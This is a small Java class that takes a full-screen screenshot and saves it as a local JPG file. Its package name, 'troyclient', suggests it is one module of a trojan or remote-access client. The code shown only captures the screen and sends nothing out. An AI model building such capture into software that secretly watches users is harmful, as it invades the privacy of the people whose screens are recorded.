package ch.lebois.troyclient.functions;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.util.Date;
import javax.imageio.ImageIO;

/**
 * Project: Hermann
 **/

public class Screenshot {

    public String takeScreenshot() {
        File file = new File(String.valueOf(new Date().getTime()) + ".jpg");
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);

            ImageIO.write(screenFullImage, "jpg", file);
        } catch (AWTException | IOException ignored) {
            System.out.println("Error with Screenshot");
        }
        return file.getPath();
    }
}